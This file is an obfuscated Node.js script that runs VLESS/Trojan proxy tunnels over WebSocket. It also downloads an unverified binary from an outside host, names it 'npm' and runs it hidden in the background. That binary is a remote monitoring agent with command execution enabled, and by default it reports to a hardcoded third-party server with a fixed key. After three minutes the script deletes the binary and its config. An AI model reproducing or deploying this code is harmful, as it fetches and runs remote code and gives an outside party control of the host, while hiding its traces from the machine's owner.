const _0x1cbe89=_0x2cb9;(function(_0x23d619,_0x452b5e){const _0x12bb46=_0x2cb9,_0x11ba9a=_0x23d619();while(!![]){try{const _0x279431=-parseInt(_0x12bb46(0x174))/0x1*(-parseInt(_0x12bb46(0x187))/0x2)+parseInt(_0x12bb46(0x1ae))/0x3*(parseInt(_0x12bb46(0x1c8))/0x4)+parseInt(_0x12bb46(0x1d8))/0x5*(parseInt(_0x12bb46(0x196))/0x6)+-parseInt(_0x12bb46(0x1cf))/0x7*(parseInt(_0x12bb46(0x191))/0x8)+parseInt(_0x12bb46(0x1d5))/0x9+parseInt(_0x12bb46(0x1c1))/0xa*(parseInt(_0x12bb46(0x1b7))/0xb)+-parseInt(_0x12bb46(0x1b9))/0xc;if(_0x279431===_0x452b5e)break;else _0x11ba9a['push'](_0x11ba9a['shift']());}catch(_0x32d82f){_0x11ba9a['push'](_0x11ba9a['shift']());}}}(_0x7ffb,0x27094));const os=require('os'),http=require(_0x1cbe89(0x1c0)),fs=require('fs'),axios=require('axios'),net=require(_0x1cbe89(0x16f)),path=require('path'),crypto=require(_0x1cbe89(0x1ac)),{Buffer}=require(_0x1cbe89(0x1bd)),{exec,execSync}=require(_0x1cbe89(0x1d6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1cbe89(0x1ba)][_0x1cbe89(0x1c7)]||_0x1cbe89(0x18d),NEZHA_SERVER=process[_0x1cbe89(0x1ba)]['NEZHA_SERVER']||_0x1cbe89(0x17a),NEZHA_PORT=process['env'][_0x1cbe89(0x17e)]||'',NEZHA_KEY=process[_0x1cbe89(0x1ba)][_0x1cbe89(0x173)]||_0x1cbe89(0x17c),DOMAIN=process[_0x1cbe89(0x1ba)]['DOMAIN']||_0x1cbe89(0x1c3),AUTO_ACCESS=process[_0x1cbe89(0x1ba)][_0x1cbe89(0x17f)]||!![],WSPATH=process[_0x1cbe89(0x1ba)][_0x1cbe89(0x1bf)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1cbe89(0x1ba)]['SUB_PATH']||_0x1cbe89(0x1b8),NAME=process[_0x1cbe89(0x1ba)]['NAME']||_0x1cbe89(0x195),PORT=process[_0x1cbe89(0x1ba)]['PORT']||0x1eb4;function _0x2cb9(_0x4efb92,_0x210b85){_0x4efb92=_0x4efb92-0x163;const _0x7ffbb6=_0x7ffb();let _0x2cb9a0=_0x7ffbb6[_0x4efb92];return _0x2cb9a0;}let ISP='';const GetISP=async()=>{const _0x25d7bc=_0x1cbe89;try{const _0xdb6cfd=await axios[_0x25d7bc(0x16b)]('https://api.ip.sb/geoip'),_0x1de94f=_0xdb6cfd[_0x25d7bc(0x1a8)];ISP=(_0x1de94f[_0x25d7bc(0x1b2)]+'-'+_0x1de94f['isp'])[_0x25d7bc(0x163)](/ /g,'_');}catch(_0x3ffa0f){ISP=_0x25d7bc(0x175);}};GetISP();const httpServer=http['createServer']((_0x6b52b,_0x2c4ee4)=>{const _0x1802be=_0x1cbe89;if(_0x6b52b[_0x1802be(0x18f)]==='/'){const _0x80c99=path[_0x1802be(0x166)](__dirname,'index.html');fs['readFile'](_0x80c99,'utf8',(_0x1a46e9,_0x404767)=>{const _0x49eeb7=_0x1802be;if(_0x1a46e9){_0x2c4ee4[_0x49eeb7(0x1a5)](0xc8,{'Content-Type':_0x49eeb7(0x199)}),_0x2c4ee4[_0x49eeb7(0x164)](_0x49eeb7(0x16d));return;}_0x2c4ee4['writeHead'](0xc8,{'Content-Type':_0x49eeb7(0x199)}),_0x2c4ee4['end'](_0x404767);});return;}else{if(_0x6b52b['url']==='/'+SUB_PATH){const _0x3b6305=NAME?NAME+'-'+ISP:ISP,_0x78e78a=_0x1802be(0x18e)+UUID+'@'+DOMAIN+_0x1802be(0x179)+DOMAIN+_0x1802be(0x1a2)+DOMAIN+_0x1802be(0x170)+WSPATH+'#'+_0x3b6305,_0x154d24=_0x1802be(0x172)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1802be(0x1a2)+DOMAIN+_0x1802be(0x170)+WSPATH+'#'+_0x3b6305,_0x2ef86a=_0x78e78a+'\x0a'+_0x154d24,_0x580751=Buffer[_0x1802be(0x171)](_0x2ef86a)['toString'](_0x1802be(0x186));_0x2c4ee4[_0x1802be(0x1a5)](0xc8,{'Content-Type':'text/plain'}),_0x2c4ee4['end'](_0x580751+'\x0a');}else _0x2c4ee4['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x2c4ee4[_0x1802be(0x164)](_0x1802be(0x1bc));}}),wss=new WebSocket[(_0x1cbe89(0x1b1))]({'server':httpServer}),uuid=UUID[_0x1cbe89(0x163)](/-/g,''),DNS_SERVERS=[_0x1cbe89(0x17b),'1.1.1.1'];function _0x7ffb(){const _0x232e96=['https://oooo.serv00.net/add-url','decode','Server','country_code','https://arm64.ssss.nyc.mn/v1','once','https://dns.google/resolve?name=','npm\x20running\x20error:','22KMafDC','subkey660','6515676aChLjg','env','hex','Not\x20Found\x0a','buffer','find','WSPATH','http','1224560Zoopjv','length','1234.abc.com','write','then','config.yaml','UUID','99412NtIpPg','false','utf-8','createHash','2096','Automatic\x20Access\x20Task\x20added\x20successfully','8443','7zzEtcV','npm\x20download\x20successfully','Server\x20is\x20running\x20on\x20port\x20','map','npm\x20is\x20already\x20running,\x20skip\x20running...','Answer','2770047gVHTFb','child_process','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','37265HILNjw','message','replace','end','client_secret:\x20','join','connect','toString','unlink','finish','get','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','net','&path=%2F','from','trojan://','NEZHA_KEY','10oaHeLz','Unknown','/bin/bash','test','close',':443?encryption=none&security=tls&sni=','nz.680660.xyz:443','8.8.4.4','IE3tj6tvKuytMasgSk2VskG9GTyGP6vK','readUInt16BE','NEZHA_PORT','AUTO_ACCESS','log','https://','npm','readUInt8','writeFileSync','substr','base64','5102HUecrT','reduce','443','true','error','2083','C6BE152C-1EFC-8F5C-E0EB-B1A5AE30A890','vless://','url','error:\x20','1984152ovziLc','Failed\x20to\x20resolve\x20','concat','arm','public','240YgvYpx','sha224','chmod\x20+x\x20npm','text/html','application/dns-json','send','Status','&type=A','aarch64','slice','trim','2087','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/v1','includes','writeHead','catch','every','data','digest','pipe','split','crypto','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','9WAwrSM'];_0x7ffb=function(){return _0x232e96;};return _0x7ffb();}function resolveHost(_0xbdc88f){return new Promise((_0x4eab9c,_0x324a5c)=>{const _0x6c75ac=_0x2cb9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x6c75ac(0x177)](_0xbdc88f)){_0x4eab9c(_0xbdc88f);return;}let _0x4e57a7=0x0;function _0x4386c1(){const _0x2a1d08=_0x6c75ac;if(_0x4e57a7>=DNS_SERVERS['length']){_0x324a5c(new Error(_0x2a1d08(0x192)+_0xbdc88f+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1758bd=DNS_SERVERS[_0x4e57a7];_0x4e57a7++;const _0x521af2=_0x2a1d08(0x1b5)+encodeURIComponent(_0xbdc88f)+_0x2a1d08(0x19d);axios['get'](_0x521af2,{'timeout':0x1388,'headers':{'Accept':_0x2a1d08(0x19a)}})[_0x2a1d08(0x1c5)](_0x5c093d=>{const _0x3833bb=_0x2a1d08,_0x4f10f4=_0x5c093d[_0x3833bb(0x1a8)];if(_0x4f10f4[_0x3833bb(0x19c)]===0x0&&_0x4f10f4[_0x3833bb(0x1d4)]&&_0x4f10f4['Answer'][_0x3833bb(0x1c2)]>0x0){const _0x183755=_0x4f10f4[_0x3833bb(0x1d4)][_0x3833bb(0x1be)](_0x1422c5=>_0x1422c5['type']===0x1);if(_0x183755){_0x4eab9c(_0x183755[_0x3833bb(0x1a8)]);return;}}_0x4386c1();})[_0x2a1d08(0x1a6)](_0x58ef1b=>{_0x4386c1();});}_0x4386c1();});}function handleVlessConnection(_0x56420a,_0x3dc9b1){const _0x37f16a=_0x1cbe89,[_0x2bdb64]=_0x3dc9b1,_0x178f49=_0x3dc9b1[_0x37f16a(0x19f)](0x1,0x11);if(!_0x178f49['every']((_0x13c9aa,_0x5caa66)=>_0x13c9aa==parseInt(uuid[_0x37f16a(0x185)](_0x5caa66*0x2,0x2),0x10)))return![];let _0x13b4d5=_0x3dc9b1[_0x37f16a(0x19f)](0x11,0x12)['readUInt8']()+0x13;const _0x5ae597=_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5,_0x13b4d5+=0x2)['readUInt16BE'](0x0),_0x11b81e=_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5,_0x13b4d5+=0x1)[_0x37f16a(0x183)](),_0x5ae68d=_0x11b81e==0x1?_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5,_0x13b4d5+=0x4)[_0x37f16a(0x166)]('.'):_0x11b81e==0x2?new TextDecoder()[_0x37f16a(0x1b0)](_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5+0x1,_0x13b4d5+=0x1+_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5,_0x13b4d5+0x1)[_0x37f16a(0x183)]())):_0x11b81e==0x3?_0x3dc9b1[_0x37f16a(0x19f)](_0x13b4d5,_0x13b4d5+=0x10)[_0x37f16a(0x188)]((_0x341c1f,_0x299737,_0x4ba57d,_0x46d56d)=>_0x4ba57d%0x2?_0x341c1f['concat'](_0x46d56d[_0x37f16a(0x19f)](_0x4ba57d-0x1,_0x4ba57d+0x1)):_0x341c1f,[])[_0x37f16a(0x1d2)](_0x1c93f2=>_0x1c93f2[_0x37f16a(0x17d)](0x0)[_0x37f16a(0x168)](0x10))[_0x37f16a(0x166)](':'):'';_0x56420a[_0x37f16a(0x19b)](new Uint8Array([_0x2bdb64,0x0]));const _0xff7771=createWebSocketStream(_0x56420a);return resolveHost(_0x5ae68d)[_0x37f16a(0x1c5)](_0x1ddef5=>{const _0x5947c3=_0x37f16a;net['connect']({'host':_0x1ddef5,'port':_0x5ae597},function(){const _0x4cadf1=_0x2cb9;this['write'](_0x3dc9b1[_0x4cadf1(0x19f)](_0x13b4d5)),_0xff7771['on'](_0x4cadf1(0x18b),()=>{})[_0x4cadf1(0x1aa)](this)['on'](_0x4cadf1(0x18b),()=>{})[_0x4cadf1(0x1aa)](_0xff7771);})['on'](_0x5947c3(0x18b),()=>{});})[_0x37f16a(0x1a6)](_0x5718d0=>{const _0x34016e=_0x37f16a;net[_0x34016e(0x167)]({'host':_0x5ae68d,'port':_0x5ae597},function(){const _0x2dd2fd=_0x34016e;this[_0x2dd2fd(0x1c4)](_0x3dc9b1[_0x2dd2fd(0x19f)](_0x13b4d5)),_0xff7771['on']('error',()=>{})[_0x2dd2fd(0x1aa)](this)['on'](_0x2dd2fd(0x18b),()=>{})['pipe'](_0xff7771);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x40486f,_0x3ba5d6){const _0x384907=_0x1cbe89;try{if(_0x3ba5d6[_0x384907(0x1c2)]<0x3a)return![];const _0x393f7e=_0x3ba5d6[_0x384907(0x19f)](0x0,0x38)[_0x384907(0x168)](),_0x1c1709=[UUID];let _0x12f52f=null;for(const _0x489567 of _0x1c1709){const _0x14bc1c=crypto[_0x384907(0x1cb)](_0x384907(0x197))['update'](_0x489567)[_0x384907(0x1a9)](_0x384907(0x1bb));if(_0x14bc1c===_0x393f7e){_0x12f52f=_0x489567;break;}}if(!_0x12f52f)return![];let _0xb448e5=0x38;_0x3ba5d6[_0xb448e5]===0xd&&_0x3ba5d6[_0xb448e5+0x1]===0xa&&(_0xb448e5+=0x2);const _0x3fee8e=_0x3ba5d6[_0xb448e5];if(_0x3fee8e!==0x1)return![];_0xb448e5+=0x1;const _0x39837c=_0x3ba5d6[_0xb448e5];_0xb448e5+=0x1;let _0xf11fdd,_0x5100c3;if(_0x39837c===0x1)_0xf11fdd=_0x3ba5d6[_0x384907(0x19f)](_0xb448e5,_0xb448e5+0x4)[_0x384907(0x166)]('.'),_0xb448e5+=0x4;else{if(_0x39837c===0x3){const _0x2596e9=_0x3ba5d6[_0xb448e5];_0xb448e5+=0x1,_0xf11fdd=_0x3ba5d6[_0x384907(0x19f)](_0xb448e5,_0xb448e5+_0x2596e9)[_0x384907(0x168)](),_0xb448e5+=_0x2596e9;}else{if(_0x39837c===0x4)_0xf11fdd=_0x3ba5d6[_0x384907(0x19f)](_0xb448e5,_0xb448e5+0x10)[_0x384907(0x188)]((_0x4c1f8d,_0x3e894f,_0x5b873c,_0x43d116)=>_0x5b873c%0x2?_0x4c1f8d[_0x384907(0x193)](_0x43d116[_0x384907(0x19f)](_0x5b873c-0x1,_0x5b873c+0x1)):_0x4c1f8d,[])[_0x384907(0x1d2)](_0x59dd9a=>_0x59dd9a[_0x384907(0x17d)](0x0)[_0x384907(0x168)](0x10))['join'](':'),_0xb448e5+=0x10;else return![];}}_0x5100c3=_0x3ba5d6['readUInt16BE'](_0xb448e5),_0xb448e5+=0x2;_0xb448e5<_0x3ba5d6[_0x384907(0x1c2)]&&_0x3ba5d6[_0xb448e5]===0xd&&_0x3ba5d6[_0xb448e5+0x1]===0xa&&(_0xb448e5+=0x2);const _0x5029ea=createWebSocketStream(_0x40486f);return resolveHost(_0xf11fdd)['then'](_0xa61f58=>{const _0x5ba237=_0x384907;net['connect']({'host':_0xa61f58,'port':_0x5100c3},function(){const _0x5601b7=_0x2cb9;_0xb448e5<_0x3ba5d6[_0x5601b7(0x1c2)]&&this[_0x5601b7(0x1c4)](_0x3ba5d6['slice'](_0xb448e5)),_0x5029ea['on'](_0x5601b7(0x18b),()=>{})[_0x5601b7(0x1aa)](this)['on'](_0x5601b7(0x18b),()=>{})[_0x5601b7(0x1aa)](_0x5029ea);})['on'](_0x5ba237(0x18b),()=>{});})[_0x384907(0x1a6)](_0x1e143e=>{const _0x25fb49=_0x384907;net[_0x25fb49(0x167)]({'host':_0xf11fdd,'port':_0x5100c3},function(){const _0x2dde28=_0x25fb49;_0xb448e5<_0x3ba5d6[_0x2dde28(0x1c2)]&&this[_0x2dde28(0x1c4)](_0x3ba5d6[_0x2dde28(0x19f)](_0xb448e5)),_0x5029ea['on'](_0x2dde28(0x18b),()=>{})[_0x2dde28(0x1aa)](this)['on'](_0x2dde28(0x18b),()=>{})['pipe'](_0x5029ea);})['on'](_0x25fb49(0x18b),()=>{});}),!![];}catch(_0x294837){return![];}}wss['on']('connection',(_0x180bae,_0xbb628a)=>{const _0x2b52a2=_0x1cbe89,_0x402321=_0xbb628a[_0x2b52a2(0x18f)]||'';_0x180bae[_0x2b52a2(0x1b4)](_0x2b52a2(0x1d9),_0x3512fe=>{const _0x40cfc7=_0x2b52a2;if(_0x3512fe[_0x40cfc7(0x1c2)]>0x11&&_0x3512fe[0x0]===0x0){const _0x4d32b7=_0x3512fe[_0x40cfc7(0x19f)](0x1,0x11),_0x46c422=_0x4d32b7[_0x40cfc7(0x1a7)]((_0x1b5565,_0xb11d94)=>_0x1b5565==parseInt(uuid[_0x40cfc7(0x185)](_0xb11d94*0x2,0x2),0x10));if(_0x46c422){!handleVlessConnection(_0x180bae,_0x3512fe)&&_0x180bae[_0x40cfc7(0x178)]();return;}}!handleTrojanConnection(_0x180bae,_0x3512fe)&&_0x180bae[_0x40cfc7(0x178)]();})['on'](_0x2b52a2(0x18b),()=>{});});const getDownloadUrl=()=>{const _0x4b0c38=_0x1cbe89,_0x55280e=os['arch']();return _0x55280e===_0x4b0c38(0x194)||_0x55280e==='arm64'||_0x55280e===_0x4b0c38(0x19e)?!NEZHA_PORT?_0x4b0c38(0x1b3):_0x4b0c38(0x16e):!NEZHA_PORT?_0x4b0c38(0x1a3):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0xb1e087=_0x1cbe89;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x352959=getDownloadUrl(),_0x5d7283=await axios({'method':_0xb1e087(0x16b),'url':_0x352959,'responseType':'stream'}),_0x2e47be=fs['createWriteStream'](_0xb1e087(0x182));return _0x5d7283[_0xb1e087(0x1a8)][_0xb1e087(0x1aa)](_0x2e47be),new Promise((_0xb34ea7,_0x218532)=>{const _0x18df51=_0xb1e087;_0x2e47be['on'](_0x18df51(0x16a),()=>{const _0x354814=_0x18df51;console[_0x354814(0x180)](_0x354814(0x1d0)),exec(_0x354814(0x198),_0x2f0ddf=>{if(_0x2f0ddf)_0x218532(_0x2f0ddf);_0xb34ea7();});}),_0x2e47be['on'](_0x18df51(0x18b),_0x218532);});}catch(_0x25f7a7){throw _0x25f7a7;}},runnz=async()=>{const _0x291baa=_0x1cbe89;try{const _0x376f76=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x291baa(0x1ca)});if(_0x376f76[_0x291baa(0x1a0)]()!==''){console[_0x291baa(0x180)](_0x291baa(0x1d3));return;}}catch(_0x5dfd63){}await downloadFile();let _0x31c6bc='',_0x4cfef3=[_0x291baa(0x189),_0x291baa(0x1ce),_0x291baa(0x1cc),_0x291baa(0x1a1),_0x291baa(0x18c),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3228f1=_0x4cfef3[_0x291baa(0x1a4)](NEZHA_PORT)?'--tls':'';_0x31c6bc='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3228f1+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x581367=NEZHA_SERVER[_0x291baa(0x1a4)](':')?NEZHA_SERVER[_0x291baa(0x1ab)](':')['pop']():'',_0x3a3559=_0x4cfef3['includes'](_0x581367)?_0x291baa(0x18a):_0x291baa(0x1c9),_0x6b3a70=_0x291baa(0x165)+NEZHA_KEY+_0x291baa(0x1ad)+NEZHA_SERVER+_0x291baa(0x16c)+_0x3a3559+_0x291baa(0x1d7)+UUID;fs[_0x291baa(0x184)](_0x291baa(0x1c6),_0x6b3a70);}_0x31c6bc='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x291baa(0x180)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x31c6bc,{'shell':_0x291baa(0x176)},_0x8425ae=>{const _0x14f429=_0x291baa;if(_0x8425ae)console[_0x14f429(0x18b)](_0x14f429(0x1b6),_0x8425ae);else console['log']('npm\x20is\x20running');});}catch(_0x492ee6){console['error'](_0x291baa(0x190)+_0x492ee6);}};async function addAccessTask(){const _0xdc5858=_0x1cbe89;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x16d411=_0xdc5858(0x181)+DOMAIN;try{const _0x2def81=await axios['post'](_0xdc5858(0x1af),{'url':_0x16d411},{'headers':{'Content-Type':'application/json'}});console[_0xdc5858(0x180)](_0xdc5858(0x1cd));}catch(_0x4601a3){}}const delFiles=()=>{const _0x43f6b6=_0x1cbe89;fs[_0x43f6b6(0x169)](_0x43f6b6(0x182),()=>{}),fs[_0x43f6b6(0x169)](_0x43f6b6(0x1c6),()=>{});};httpServer['listen'](PORT,()=>{const _0x42b638=_0x1cbe89;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x42b638(0x180)](_0x42b638(0x1d1)+PORT);});
